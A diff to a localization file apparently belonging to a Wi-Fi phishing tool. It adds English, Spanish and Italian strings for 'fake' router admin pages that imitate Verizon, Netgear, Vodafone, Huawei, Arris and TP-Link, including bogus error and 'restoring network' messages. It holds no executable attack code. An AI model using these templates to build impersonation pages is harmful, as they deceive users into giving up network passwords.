@@ -39,6 +39,7 @@ white="\033[1;37m"
 grey="\033[0;37m"
 purple="\033[0;35m"
 red="\033[1;31m"
+red_color_slim="\033[0;031m"
 green="\033[1;32m"
 yellow="\033[1;33m"
 Purple="\033[0;35m"
@@ -411,6 +412,575 @@ DIALOG_WEB_LENGHT_MIN_BG="Паролата трябва да съдържа по
 DIALOG_WEB_LENGHT_MAX_BG="Паролата трябва да съдържа по-малко от {0} символа!"
 DIALOG_WEB_DIR_BG="ltr"
 
+##################### DIALOG-WEB-FAKES-########################################################
+####################     ENGLAND       ########################################################
+####DIALOG-INDEX-VERIZON######
+DIALOG_WEB_INDEX_VERIZON_ENG1="<font color=\"black\" >MAIN"
+DIALOG_WEB_INDEX_VERIZON_ENG2="<font color=\"black\" >WIRELESS"
+DIALOG_WEB_INDEX_VERIZON_ENG3="<font color=\"black\" >NETWORK"
+DIALOG_WEB_INDEX_VERIZON_ENG4="<font color=\"black\" >FIREWAL"
+DIALOG_WEB_INDEX_VERIZON_ENG5="<font color=\"black\" >CONTROL"
+DIALOG_WEB_INDEX_VERIZON_ENG6="<font color=\"black\" >ADVANCED"
+DIALOG_WEB_INDEX_VERIZON_ENG7="<font color=\"black\" >MONITORING"
+DIALOG_WEB_INDEX_VERIZON_ENG8="<font color=\"black\" >MAIN"
+DIALOG_WEB_INDEX_VERIZON_ENG9="<font color=\"black\" >WIRELLES STATUS"
+DIALOG_WEB_INDEX_VERIZON_ENG10="<font color=\"black\" >HOME"
+DIALOG_WEB_INDEX_VERIZON_ENG11="<font color=\"white\" >ADVANCED SECURITY"
+DIALOG_WEB_INDEX_VERIZON_ENG12="<font color=\"black\" >LOGOUT"
+DIALOG_WEB_INDEX_VERIZON_ENG13="<font color=\"white\" >NETWORK"
+DIALOG_WEB_INDEX_VERIZON_ENG14="<font color=\"white\" >ACCES"
+DIALOG_WEB_INDEX_VERIZON_ENG15="<font color=\"white\" >DEVICES"
+DIALOG_WEB_INDEX_VERIZON_ENG16="<font color=\"black\" >ACCESS--INFORMATION "
+DIALOG_WEB_INDEX_VERIZON_ENG17="<font color=\"black\" >--ACCESS--INFORMATION--"
+####DIALOG-INDEX-NETGEAR######
+DIALOG_WEB_INDEX_NETGEAR_ENG1="<font color=\"black\" > BASIC"
+DIALOG_WEB_INDEX_NETGEAR_ENG2="<font color=\"black\" >ADVANZED"
+DIALOG_WEB_INDEX_NETGEAR_ENG3="<font color=\"white\" >ADVANZED Home"
+DIALOG_WEB_INDEX_NETGEAR_ENG4="<font color=\"black\" >Setup Wizar"
+DIALOG_WEB_INDEX_NETGEAR_ENG5="<font color=\"black\" >WPS WIZAR   Administration"
+DIALOG_WEB_INDEX_NETGEAR_ENG6="<font color=\"black\" >Setup"
+DIALOG_WEB_INDEX_NETGEAR_ENG7="<font color=\"black\" >Security"
+DIALOG_WEB_INDEX_NETGEAR_ENG8="<font color=\"black\" >Administraion"
+DIALOG_WEB_INDEX_NETGEAR_ENG9="<font color=\"black\" >STATE :<font color=\"green\" > ERROR"
+DIALOG_WEB_INDEX_NETGEAR_ENG10="<font color=\"black\" >STATE :<font color=\"green\" > OFF"
+DIALOG_WEB_INDEX_NETGEAR_ENG11="<font color=\"black\" >LINKED NETWORK DEVICES"
+DIALOG_WEB_INDEX_NETGEAR_ENG12="<font color=\"black\" >Dispositives :<font color=\"green\" > 0"
+DIALOG_WEB_INDEX_NETGEAR_ENG13="<font color=\"black\" >GUEST NETWORK"
+DIALOG_WEB_INDEX_NETGEAR_ENG14="<font color=\"black\" >STATE :<font color=\"green\" > OFF "
+DIALOG_WEB_INDEX_NETGEAR_ENG15="<font color=\"black\" >Wireless connection"
+DIALOG_WEB_INDEX_NETGEAR_ENG16="<font color=\"black\" >STATE :<font color=\"green\" > OFF "
+DIALOG_WEB_INDEX_NETGEAR_ENG17="<font color=\"#7671BF\" >CENTER SOLUTIONS"
+DIALOG_WEB_INDEX_NETGEAR_ENG18="<font color=\"#7671BF\" >SOLVING PROBLEMS MANAGEMENT"
+DIALOG_WEB_INDEX_NETGEAR_ENG19="<font color=\"black\" >INTERNET"
+DIALOG_WEB_INDEX_NETGEAR_ENG20="<font color=\"black\" >PARENTAL CONTROL"
+DIALOG_WEB_INDEX_NETGEAR_ENG21="<font color=\"#7671BF\">ACCESS CONTROL"
+DIALOG_WEB_INDEX_NETGEAR_ENG22="<font color=\"#7671BF\">DEVICE"
+DIALOG_WEB_INDEX_NETGEAR_ENG23="<font color=\"#7671BF\">AND NETWORK "
+DIALOG_WEB_INDEX_NETGEAR_ENG24="<font color=\"#7671BF\" > SYSTEM SERVICES--------"
+####DIALOG-INDEX-VODAFONE######
+DIALOG_WEB_INDEX_VODAFONE_ENG1="**-SERVICE STATUS-**"
+DIALOG_WEB_INDEX_VODAFONE_ENG2="+Applications"
+DIALOG_WEB_INDEX_VODAFONE_ENG3="+Vodafone Wifi"
+DIALOG_WEB_INDEX_VODAFONE_ENG4="+Dhcp IP Dmz"
+DIALOG_WEB_INDEX_VODAFONE_ENG5="+Mobile Broadband"
+DIALOG_WEB_INDEX_VODAFONE_ENG6="***-HOME NETWORK-***"
+DIALOG_WEB_INDEX_VODAFONE_ENG7="+File Server"
+DIALOG_WEB_INDEX_VODAFONE_ENG8="+Sistem"
+DIALOG_WEB_INDEX_VODAFONE_ENG9="*******-SMS-*******"
+DIALOG_WEB_INDEX_VODAFONE_ENG10="+Create SMS"
+DIALOG_WEB_INDEX_VODAFONE_ENG11="+Inbox"
+DIALOG_WEB_INDEX_VODAFONE_ENG12="+Sent"
+DIALOG_WEB_INDEX_VODAFONE_ENG13="+Draft"
+DIALOG_WEB_INDEX_VODAFONE_ENG14="*****-SUPPORT-*****"
+DIALOG_WEB_INDEX_VODAFONE_ENG15=" UPGRADE"
+DIALOG_WEB_INDEX_VODAFONE_ENG16="Status:Connection This page displays information on the status "
+DIALOG_WEB_INDEX_VODAFONE_ENG17="--ACCESS--INFORMATION--"
+DIALOG_WEB_INDEX_VODAFONE_ENG18=""
+DIALOG_WEB_INDEX_VODAFONE_ENG19="STATUS"
+DIALOG_WEB_INDEX_VODAFONE_ENG20="CONNECT"
+DIALOG_WEB_INDEX_VODAFONE_ENG21="WIFI"
+DIALOG_WEB_INDEX_VODAFONE_ENG22="DEFICIENCE"
+####DIALOG-INDEX-HUAWEI######
+DIALOG_WEB_INDEX_HUAWEI_ENG1="STATUS"
+DIALOG_WEB_INDEX_HUAWEI_ENG2="BASIC"
+DIALOG_WEB_INDEX_HUAWEI_ENG3="ADVANCED"
+DIALOG_WEB_INDEX_HUAWEI_ENG4="TOOLS"
+DIALOG_WEB_INDEX_HUAWEI_ENG5="SERVICE"
+DIALOG_WEB_INDEX_HUAWEI_ENG6="Click here for more info"
+####DIALOG-INDEX-ARRIS######
+DIALOG_WEB_INDEX_ARRIS_ENG1="WIRELESS"
+DIALOG_WEB_INDEX_ARRIS_ENG2="RESTORATION"
+DIALOG_WEB_INDEX_ARRIS_ENG3="SECURITY"
+DIALOG_WEB_INDEX_ARRIS_ENG4="CONNECTION"
+DIALOG_WEB_INDEX_ARRIS_ENG5="SISTEM"
+DIALOG_WEB_INDEX_ARRIS_ENG6="SETTINGS"
+DIALOG_WEB_INDEX_ARRIS_ENG7="CONNECTION"
+DIALOG_WEB_INDEX_ARRIS_ENG8="ESTATE"
+DIALOG_WEB_INDEX_ARRIS_ENG9=
+####DIALOG-INDEX-TPLINK######
+DIALOG_WEB_INDEX_TPLINK_ENG1="Lock Center"
+DIALOG_WEB_INDEX_TPLINK_ENG2="Quick Setup"
+DIALOG_WEB_INDEX_TPLINK_ENG3="Wireless"
+DIALOG_WEB_INDEX_TPLINK_ENG4="Dhcp"
+DIALOG_WEB_INDEX_TPLINK_ENG5="Network"
+DIALOG_WEB_INDEX_TPLINK_ENG6="Forwarding"
+DIALOG_WEB_INDEX_TPLINK_ENG7="Security"
+DIALOG_WEB_INDEX_TPLINK_ENG8="Parental Control"
+DIALOG_WEB_INDEX_TPLINK_ENG9="Access Control"
+DIALOG_WEB_INDEX_TPLINK_ENG10="Static Routing"
+DIALOG_WEB_INDEX_TPLINK_ENG11="Bandwidth Control"
+DIALOG_WEB_INDEX_TPLINK_ENG12="IP & MAC Binding"
+DIALOG_WEB_INDEX_TPLINK_ENG13="Dynamic DNS"
+DIALOG_WEB_INDEX_TPLINK_ENG14="System Tools"
+DIALOG_WEB_INDEX_TPLINK_ENG15="Status Help"
+DIALOG_WEB_INDEX_TPLINK_ENG16="Lock Center"
+DIALOG_WEB_INDEX_TPLINK_ENG17="CONTINUE RESTORING NETWORK"
+DIALOG_WEB_INDEX_TPLINK_ENG18="</head><body><h1>Status Help</h1>
+<p> The <b>Status</b> page displays the Router's current status and configuration. All information is read-only.
+</p><p><b>LAN</b> - The following parameters apply to the LAN port of the Router. You can configure them in the <b>Network -&gt; LAN</b> page.
+</p><ul>
+<li><b>MAC Address</b> - The physical address of the Router, as seen from the LAN.
+</li><li><b>IP Address</b> - The LAN IP address of the Router.
+	</li><li><b>Subnet Mask</b> - The subnet mask associated with LAN IP address.</li>
+</ul>
+
+<p><b>Wireless</b> - These are the current settings or information for Wireless.You can configure them in the <b>Wireless -&gt; Wireless Settings</b> page. 
+</p><ul>
+  	<li><b>Wireless Radio</b> - Indicates whether the wireless radio feature of the Router is enabled or disabled.
+    </li><li><b>Name(SSID)</b> - The SSID of the Router.  
+    </li><li><b>Channel</b> - The current wireless channel in use. </li>
+	<li><b>Mode</b> - The current wireless mode which the Router works on. </li>
+    <li><b>Channel Width</b> - The bandwidth of the wireless channel.</li>
+	<li><b>Max Tx Rate</b> - The maximum tx rate.</li>
+	<li><b>MAC Address</b> - The physical address of the Router, as seen from the WLAN.</li>"
+DIALOG_WEB_INDEX_TPLINK_ENG19="<li><b>WDS Status</b> - The status of WDS' connection, Init: 
+WDS connection is down; Scan: Try to find the AP; Auth: Try to 
+authenticate; ASSOC: Try to associate; Run: Associated successfully.</li>
+	</ul>
+<p><b>WAN</b> - The following parameters apply to the WAN ports of the Router. You can configure them in the <strong><b>Network -&gt; WAN</b></strong> page.
+</p><ul>
+<li><b>MAC Address</b> - The physical address of the WAN port, as seen from
+the Internet.
+</li><li><b>IP Address</b> - The current WAN (Internet) IP Address. This field will be blank or
+	0.0.0.0 if the IP Address is assigned dynamically and there is no connection to 
+	Internet. 
+</li><li><b>Subnet Mask</b> - The subnet mask associated with the WAN IP Address. 
+</li><li><b>Default Gateway</b> - The Gateway currently used by the Router is shown here. When you use <b>Dynamic IP</b> as the connection Internet type, the <b>Renew</b> button will be displayed here. Click the <b>Renew</b> button to obtain new IP parameters dynamically
+from the ISP. And if you have got an IP address <b>Release</b> button will be displayed here. Click the <b>Release</b> button to release the IP address the Router has obtained from the ISP.
+</li><li><b>DNS Server</b> - The DNS (Domain Name System) Server IP 
+addresses currently used by the Router. Multiple DNS IP settings are 
+common. Usually, the first available DNS Server is used.</li>
+<li><b>Online Time</b> - The time that you online. When you use <strong>PPPoE</strong> 
+      as WAN connection type, the online time is displayed here. Click the <strong>Connect</strong> 
+      or <strong>Disconnect</strong> button to connect to or disconnect from Internet.</li>
+</ul>
+<p><b>Secondary Connection</b> - Besides PPPoE, if you use an extra 
+connection type to connect to a local area network provided by ISP, then
+ parameters of this secondary connection will be shown in this area.</p>
+<p><b>Traffic Statistics</b> - The Router's traffic statistics.
+</p><ul>
+	<li><b>Sent (Bytes)</b> - Traffic that counted in bytes has been sent out from the WAN port.</li>
+	<li><b>Sent (Packets)</b> - Traffic that counted in packets has been sent out from WAN port.</li>
+	<li><b>Received (Bytes)</b> - Traffic that counted in bytes has been received from the WAN port.</li>
+	 <li><b>Received (Packets)</b> - Traffic that counted in packets has been received from the WAN port.</li>
+</ul>
+<p><b>System Up Time</b> -  The length of the time since the Router was last powered on or reset.
+</p><p>Click the <b>Refresh</b> button to get the latest status and settings of the Router.
+
+</p>"
+
+##################### DIALOG-WEB-FAKES-########################################################
+####################     ESPAIN       ########################################################
+####DIALOG-INDEX-VERIZON######
+DIALOG_WEB_INDEX_VERIZON_ESP1="<font color=\"black\" >MENU"
+DIALOG_WEB_INDEX_VERIZON_ESP2="<font color=\"black\" >WIRELESS"
+DIALOG_WEB_INDEX_VERIZON_ESP3="<font color=\"black\" >RED"
+DIALOG_WEB_INDEX_VERIZON_ESP4="<font color=\"black\" >FIREWAL"
+DIALOG_WEB_INDEX_VERIZON_ESP5="<font color=\"black\" >CONTROL"
+DIALOG_WEB_INDEX_VERIZON_ESP6="<font color=\"black\" >AVANZADO"
+DIALOG_WEB_INDEX_VERIZON_ESP7="<font color=\"black\" >SUPERVISIÓN"
+DIALOG_WEB_INDEX_VERIZON_ESP8="<font color=\"black\" >MENU ACCESO"
+DIALOG_WEB_INDEX_VERIZON_ESP9="<font color=\"black\" >ESTADO DE RED"
+DIALOG_WEB_INDEX_VERIZON_ESP10="<font color=\"black\" >ROUTER"
+DIALOG_WEB_INDEX_VERIZON_ESP11="<font color=\"white\" >SEGURIDAD AVANZADA"
+DIALOG_WEB_INDEX_VERIZON_ESP12="<font color=\"black\" >SESION"
+DIALOG_WEB_INDEX_VERIZON_ESP13="<font color=\"white\" >SISTEMA"
+DIALOG_WEB_INDEX_VERIZON_ESP14="<font color=\"white\" >ACESO"
+DIALOG_WEB_INDEX_VERIZON_ESP15="<font color=\"white\" >DISPOSITIVOS"
+DIALOG_WEB_INDEX_VERIZON_ESP16="<font color=\"black\" >--INFORMACION DE ACCESO "
+DIALOG_WEB_INDEX_VERIZON_ESP17="<font color=\"black\" >--ACCESS--INFORMATION--"
+####DIALOG-INDEX-NETGEAR######
+DIALOG_WEB_INDEX_NETGEAR_ESP1="<font color=\"black\" >BASICO"
+DIALOG_WEB_INDEX_NETGEAR_ESP2="<font color=\"black\" >AVANZADO"
+DIALOG_WEB_INDEX_NETGEAR_ESP3="<font color=\"white\" >Servicio"
+DIALOG_WEB_INDEX_NETGEAR_ESP4="<font color=\"black\" >Conexion de Red"
+DIALOG_WEB_INDEX_NETGEAR_ESP5="<font color=\"black\" >Dispositivos vinculados"
+DIALOG_WEB_INDEX_NETGEAR_ESP6="<font color=\"black\" >Control Parental"
+DIALOG_WEB_INDEX_NETGEAR_ESP7="<font color=\"black\" >Voz"
+DIALOG_WEB_INDEX_NETGEAR_ESP8="<font color=\"black\" >Red de invitados"
+DIALOG_WEB_INDEX_NETGEAR_ESP9="<font color=\"black\" >ESTADO :<font color=\"green\" > ERROR"
+DIALOG_WEB_INDEX_NETGEAR_ESP10="<font color=\"black\" >ESTADO :<font color=\"green\" > DESACTIVADO"
+DIALOG_WEB_INDEX_NETGEAR_ESP11="<font color=\"black\" >DISPOSITIVOS DE RED VINCULADOS"
+DIALOG_WEB_INDEX_NETGEAR_ESP12="<font color=\"black\" >Dispositivos :<font color=\"green\" > 0"
+DIALOG_WEB_INDEX_NETGEAR_ESP13="<font color=\"black\" >RED DE INVITADOS"
+DIALOG_WEB_INDEX_NETGEAR_ESP14="<font color=\"black\" >ESTADO :<font color=\"green\" > DESACTIVADO "
+DIALOG_WEB_INDEX_NETGEAR_ESP15="<font color=\"black\" >Conexion inalambrica"
+DIALOG_WEB_INDEX_NETGEAR_ESP16="<font color=\"black\" >ESTADO :<font color=\"green\" > DESACTIVADO "
+DIALOG_WEB_INDEX_NETGEAR_ESP17="<font color=\"#7671BF\" >CENTRO DE SOLUCIONES"
+DIALOG_WEB_INDEX_NETGEAR_ESP18="<font color=\"#7671BF\" >ADMINISTRACION SOLUCION DE PROBLEMAS"
+DIALOG_WEB_INDEX_NETGEAR_ESP19="<font color=\"black\" >INTERNET"
+DIALOG_WEB_INDEX_NETGEAR_ESP20="<font color=\"black\" >CONTROL PARENTAL"
+DIALOG_WEB_INDEX_NETGEAR_ESP21="<font color=\"#7671BF\">CONTROL Y ACCESO"
+DIALOG_WEB_INDEX_NETGEAR_ESP22="<font color=\"#7671BF\">DE"
+DIALOG_WEB_INDEX_NETGEAR_ESP23="<font color=\"#7671BF\">DISPOSITIVOS DE RED "
+DIALOG_WEB_INDEX_NETGEAR_ESP24="<font color=\"#7671BF\" >¿AYUDA?--¿QUE SUCEDE?-------"
+####DIALOG-INDEX-HUAWEI######
+DIALOG_WEB_INDEX_HUAWEI_ESP1="ESTADO"
+DIALOG_WEB_INDEX_HUAWEI_ESP2="BASICO"
+DIALOG_WEB_INDEX_HUAWEI_ESP3="ADVANZADO"
+DIALOG_WEB_INDEX_HUAWEI_ESP4="WIRELESS"
+DIALOG_WEB_INDEX_HUAWEI_ESP5="SERVICIO DE RED"
+DIALOG_WEB_INDEX_HUAWEI_ESP6="Click para mas informacion"
+####DIALOG-INDEX-ARRIS######
+DIALOG_WEB_INDEX_ARRIS_ESP1="WIRELESS"
+DIALOG_WEB_INDEX_ARRIS_ESP2="CONTROL DE RED"
+DIALOG_WEB_INDEX_ARRIS_ESP3="DISPOSITIVOS"
+DIALOG_WEB_INDEX_ARRIS_ESP4="CONEXION"
+DIALOG_WEB_INDEX_ARRIS_ESP5="SISTEMA"
+DIALOG_WEB_INDEX_ARRIS_ESP6="RECURSOS"
+DIALOG_WEB_INDEX_ARRIS_ESP7="SEGURIDAD"
+DIALOG_WEB_INDEX_ARRIS_ESP8="ESTADO"
+DIALOG_WEB_INDEX_ARRIS_ESP9=
+####DIALOG-INDEX-TPLINK######
+DIALOG_WEB_INDEX_TPLINK_ESP1="Centro de control"
+DIALOG_WEB_INDEX_TPLINK_ESP2="Sistema de Red"
+DIALOG_WEB_INDEX_TPLINK_ESP3="Wireless"
+DIALOG_WEB_INDEX_TPLINK_ESP4="Dhcp"
+DIALOG_WEB_INDEX_TPLINK_ESP5="Control Paternal"
+DIALOG_WEB_INDEX_TPLINK_ESP6="Control de Acceso"
+DIALOG_WEB_INDEX_TPLINK_ESP7="Control de banda"
+DIALOG_WEB_INDEX_TPLINK_ESP8="IP y Encuadernacion"
+DIALOG_WEB_INDEX_TPLINK_ESP9="DNS dinamico"
+DIALOG_WEB_INDEX_TPLINK_ESP10="Instrumentos de Sistema"
+DIALOG_WEB_INDEX_TPLINK_ESP11="Sistema Rapido"
+DIALOG_WEB_INDEX_TPLINK_ESP12="Expedicion"
+DIALOG_WEB_INDEX_TPLINK_ESP13="Encaminamiento Estatico"
+DIALOG_WEB_INDEX_TPLINK_ESP14="Firnware y actualizacion"
+DIALOG_WEB_INDEX_TPLINK_ESP15="CENTRO DE CONTROL"
+DIALOG_WEB_INDEX_TPLINK_ESP16="CONTINUE CON LA RESTAURACION"
+DIALOG_WEB_INDEX_TPLINK_ENP17="CONTINUE RESTORING NETWORK"
+DIALOG_WEB_INDEX_TPLINK_ESP18="</head><body><h1>Ayuda Estado </ h1>
+<p> La <b> Estado </ b> muestra el estado actual y la configuracion del router. Toda la informacion es de solo lectura.
+</p><p><b>LAN</b> - Los siguientes parametros se aplican al puerto LAN del router. Se pueden configurar en el <b> Red - & gt; LAN </ b>.
+</ p> <ul>
+<li> <b> Direccion MAC </ b> - La direccion fisica del router, como se ve desde la LAN.
+</li> <li> <b> Direccion IP </ b> - La direccion IP de LAN del router.
+</li> <li> <b> máscara de subred </ b> -. La máscara de subred asociada con la direccion IP LAN </ li>
+</ul>
+
+<p> <b> Wireless </ b> - Estos son los ajustes actuales o informacion para Wireless.You pueden configurar en el <b> Wireless - & gt; Configuracion inalambrica </ b>.
+</ P> <ul>
+<li> <b> radio inalambrica </ b> - Indica si la funcion de radio inalambrica del router esta activado o desactivado.
+</ li> <li> <b> Nombre (SSID) </ b> - El SSID del router.
+</ li> <li> <b> Canal </ b> - El canal inalambrico actual en uso. </ li>
+<li> <b> Modo </ b> - El modo inalambrico actual, que el router funciona en. </ li>
+<li> <b> Ancho de canal </ b> -. El ancho de banda del canal inalámbrico </ li>
+<li> <b> Max Tx Rate </ b> -. La tasa maxima tx </ li>
+<li> <b> Dirección MAC </ b> -. La direccion fisica del router, como se ve desde la WLAN </li>"
+DIALOG_WEB_INDEX_TPLINK_ESP19="<li><b> WDS Estado </b> - El estado de WDS 'de conexion, inicio:
+conexion WDS es abajo; Analiza: Trate de encontrar el punto de acceso; Aut: Trata de
+autenticar; ASSOC: Trate de asociar; Ejecute:. Asociado correctamente </li>
+</ul>
+<p><b> WAN </b> - Los siguientes parametros se aplican a los puertos WAN del router. Se pueden configurar en el <strong> <b> Red - & gt; WAN </b> </ strong>.
+</p><ul>
+<li><b> Direccion MAC </b> - La direccion fisica del puerto WAN, como se ve desde
+La Internet.
+</li><li><b> Direccion IP </b> - la direccion IP actual WAN (Internet). Este campo estara en blanco o
+0.0.0.0 Si la direccion IP se asigna de forma dinamica y no hay conexion a
+Internet.
+</li><li><b> mascara de subred </b> - La mascara de subred asociada a la direccion IP WAN.
+</li><li><b> Puerta de enlace predeterminada </ b> - La puerta de enlace utilizado actualmente por el router se muestra aqui. Cuando se utiliza <b> IP dinamica </ b> como el tipo de conexion a Internet, el <b> Renovar boton </b> se mostrara aqui. Haga clic en el <b> Renovar </b> para obtener nuevos parametros IP de forma dinamica
+desde el ISP. Y si usted tiene una direccion IP <b> boton de liberacion </b> se mostrara aqui. Haga clic en el boton <b> Release </b> para liberar la dirección IP del router ha obtenido desde el ISP.
+</li><li><b> Servidor DNS </b> - El DNS (Domain Name System) IP del servidor
+Actualmente direcciones utilizados por el router. la configuracion IP de DNS son multiples
+comun. Por lo general, se utiliza el primer servidor DNS disponible. </li>
+<li><b> Tiempo en linea </b> - El tiempo que usted en linea. Cuando se utiliza <strong> PPPoE </strong>
+como tipo de conexion WAN, el tiempo en linea se muestra aqui. Haga clic en el <strong> Conectar </strong>
+o <strong> Desconectar </strong> para conectarse o desconectarse de Internet. </li>
+</ul>
+<p> <b> conexion secundaria </b> - Ademas de PPPoE, si se utiliza un extra
+tipo de conexion para conectarse a una red de area local proporcionado por el ISP, a continuacion,
+parametros de esta conexion secundaria se mostraran en esta area. </p>
+<p><b> estadisticas de trafico </b> - estadisticas de trafico del router.
+</p> <ul>
+<li><b> Enviados (Bytes) </b> -. El trafico que contaba en bytes ha sido enviado desde el puerto WAN </li>
+<li><b> Enviados (paquetes) </b> -. El trafico que conto en paquetes ha sido enviado desde el puerto WAN </li>
+<li><b> Recibido (Bytes) </b> -. Trafico que contaba en bytes se ha recibido desde el puerto WAN </li>
+<li><b> Recibido (paquetes) </b> -. El trafico que conto en paquetes ha sido recibido desde el puerto WAN </li>
+</ul>
+<p> <b> Up System Time </b> - La longitud del tiempo transcurrido desde la ultima era router conectado o reiniciado.
+</p> <p> Haga clic en el boton <b> Actualizar </b> para obtener el ultimo estado y la configuracion del router.
+</p>"
+####DIALOG-INDEX-VODAFONE######
+DIALOG_WEB_INDEX_VODAFONE_ESP1="CONFIGURACION"
+DIALOG_WEB_INDEX_VODAFONE_ESP2="Estado"
+DIALOG_WEB_INDEX_VODAFONE_ESP3="Servicio"
+DIALOG_WEB_INDEX_VODAFONE_ESP4="Administracion"
+DIALOG_WEB_INDEX_VODAFONE_ESP5="Control Paternal"
+DIALOG_WEB_INDEX_VODAFONE_ESP6="CONTROL DE ACCESO - ALMACENAMIENTO"
+DIALOG_WEB_INDEX_VODAFONE_ESP7="Servidor Multimedia"
+DIALOG_WEB_INDEX_VODAFONE_ESP8="IP"
+DIALOG_WEB_INDEX_VODAFONE_ESP9="DNS DINAMICO"
+DIALOG_WEB_INDEX_VODAFONE_ESP10="Instrumentos"
+DIALOG_WEB_INDEX_VODAFONE_ESP11="Sistema Rapido"
+DIALOG_WEB_INDEX_VODAFONE_ESP12="Expedicion"
+DIALOG_WEB_INDEX_VODAFONE_ESP13="Evaluacion de red"
+DIALOG_WEB_INDEX_VODAFONE_ESP14="FIRNWARE "
+DIALOG_WEB_INDEX_VODAFONE_ESP15="Ayuda Estado"
+DIALOG_WEB_INDEX_VODAFONE_ESP16="CENTRO DE SOLUCIONES"
+DIALOG_WEB_INDEX_VODAFONE_ESP17="ADMINISTRACION SOLUCION DE PROBLEMAS"
+DIALOG_WEB_INDEX_VODAFONE_ESP18="Administracion Solucion de Problemas"
+DIALOG_WEB_INDEX_VODAFONE_ESP19="CONTROL Y ACCESO"
+DIALOG_WEB_INDEX_VODAFONE_ESP20="DE"
+DIALOG_WEB_INDEX_VODAFONE_ESP21="DISPOSITIVOS DE RED INFORMACION"
+DIALOG_WEB_INDEX_VODAFONE_ESP22="DEFICIENCIAS DE RED"
+##################### DIALOG-WEB-FAKES-########################################################
+####################     ITALY      ########################################################
+####DIALOG-INDEX-VERIZON######
+DIALOG_WEB_INDEX_VERIZON_IT1="<font color=\"black\" >MENU"
+DIALOG_WEB_INDEX_VERIZON_IT2="<font color=\"black\" >WIRELESS"
+DIALOG_WEB_INDEX_VERIZON_IT3="<font color=\"black\" >RED"
+DIALOG_WEB_INDEX_VERIZON_IT4="<font color=\"black\" >FIREWAL"
+DIALOG_WEB_INDEX_VERIZON_IT5="<font color=\"black\" >CONTROLLO"
+DIALOG_WEB_INDEX_VERIZON_IT6="<font color=\"black\" >ADVANCED"
+DIALOG_WEB_INDEX_VERIZON_IT7="<font color=\"black\" >SUPERVISIONE"
+DIALOG_WEB_INDEX_VERIZON_IT8="<font color=\"black\" >ACCESS MENU"
+DIALOG_WEB_INDEX_VERIZON_IT9="<font color=\"black\" >RETE DI STATO"
+DIALOG_WEB_INDEX_VERIZON_IT10="<font color=\"black\" >ROUTER"
+DIALOG_WEB_INDEX_VERIZON_IT11="<font color=\"white\" >SICUREZZA"
+DIALOG_WEB_INDEX_VERIZON_IT12="<font color=\"black\" >SESSIONE"
+DIALOG_WEB_INDEX_VERIZON_IT13="<font color=\"white\" >SISTEMA"
+DIALOG_WEB_INDEX_VERIZON_IT14="<font color=\"white\" >ACCESSO"
+DIALOG_WEB_INDEX_VERIZON_IT15="<font color=\"white\" >DISPOSITIVI"
+DIALOG_WEB_INDEX_VERIZON_IT16="<font color=\"black\" >--INFORMAZIONI DI ACCESSO-- "
+DIALOG_WEB_INDEX_VERIZON_IT17="<font color=\"black\" >--ACCESS--INFORMATION--"
+####DIALOG-INDEX-HUAWEI######
+DIALOG_WEB_INDEX_HUAWEI_IT1="ESTATO"
+DIALOG_WEB_INDEX_HUAWEI_IT2="BASE"
+DIALOG_WEB_INDEX_HUAWEI_IT3="ADVANCED"
+DIALOG_WEB_INDEX_HUAWEI_IT4="WIRELESS"
+DIALOG_WEB_INDEX_HUAWEI_IT5="SERVIZIO DI RETE"
+DIALOG_WEB_INDEX_HUAWEI_IT6="errori di connessione"
+####DIALOG-INDEX-ARRIS######
+DIALOG_WEB_INDEX_ARRIS_IT1="WIRELESS"
+DIALOG_WEB_INDEX_ARRIS_IT2="CONTROLLO RETE"
+DIALOG_WEB_INDEX_ARRIS_IT3="DISPOSITIVI"
+DIALOG_WEB_INDEX_ARRIS_IT4="COLLEGAMENTO"
+DIALOG_WEB_INDEX_ARRIS_IT5="SISTÈMA"
+DIALOG_WEB_INDEX_ARRIS_IT6="RISORSE"
+DIALOG_WEB_INDEX_ARRIS_IT7="SICUREZZA"
+DIALOG_WEB_INDEX_ARRIS_IT8="STATO"
+DIALOG_WEB_INDEX_ARRIS_IT9=
+####DIALOG-INDEX-VODAFONE######
+DIALOG_WEB_INDEX_VODAFONE_IT1="**-Stato del servizio-**"
+DIALOG_WEB_INDEX_VODAFONE_IT2="+Applicazioni"
+DIALOG_WEB_INDEX_VODAFONE_IT3="+Vodafone Wifi"
+DIALOG_WEB_INDEX_VODAFONE_IT4="+Dhcp IP Dmz"
+DIALOG_WEB_INDEX_VODAFONE_IT5="+Banda larga mobile"
+DIALOG_WEB_INDEX_VODAFONE_IT6="***-RETE DI CASA-***"
+DIALOG_WEB_INDEX_VODAFONE_IT7="+File Server"
+DIALOG_WEB_INDEX_VODAFONE_IT8="+Sistem"
+DIALOG_WEB_INDEX_VODAFONE_IT9="*******-SMS-*******"
+DIALOG_WEB_INDEX_VODAFONE_IT10="+Crea SMS"
+DIALOG_WEB_INDEX_VODAFONE_IT11="+Posta in arrivo"
+DIALOG_WEB_INDEX_VODAFONE_IT12="+Inviato"
+DIALOG_WEB_INDEX_VODAFONE_IT13="+Bozza"
+DIALOG_WEB_INDEX_VODAFONE_IT14="*****-SUPPORTO-*****"
+DIALOG_WEB_INDEX_VODAFONE_IT15=" UPGRADE"
+DIALOG_WEB_INDEX_VODAFONE_IT16="Stato: connessione Questa pagina visualizza informazioni sullo stato"
+DIALOG_WEB_INDEX_VODAFONE_IT17="--ACCESS - INFORMAZIONI--"
+DIALOG_WEB_INDEX_VODAFONE_IT18=""
+DIALOG_WEB_INDEX_VODAFONE_IT19="STATO"
+DIALOG_WEB_INDEX_VODAFONE_IT20="COLLEGARE"
+DIALOG_WEB_INDEX_VODAFONE_IT21="WIFI"
+DIALOG_WEB_INDEX_VODAFONE_IT22="CARENZE"
+####DIALOG-INDEX-NETGEAR######
+DIALOG_WEB_INDEX_NETGEAR_IT1="<font color=\"black\" >BASIC"
+DIALOG_WEB_INDEX_NETGEAR_IT2="<font color=\"black\" >AVANZATE"
+DIALOG_WEB_INDEX_NETGEAR_IT3="<font color=\"white\" >AVANZATE Casa"
+DIALOG_WEB_INDEX_NETGEAR_IT4="<font color=\"black\" >Configurazione guidata"
+DIALOG_WEB_INDEX_NETGEAR_IT5="<font color=\"black\" >WPS WIZAR   Amministrazione"
+DIALOG_WEB_INDEX_NETGEAR_IT6="<font color=\"black\" >Impostare"
+DIALOG_WEB_INDEX_NETGEAR_IT7="<font color=\"black\" >Sicurezza"
+DIALOG_WEB_INDEX_NETGEAR_IT8="<font color=\"black\" >Amministrazione"
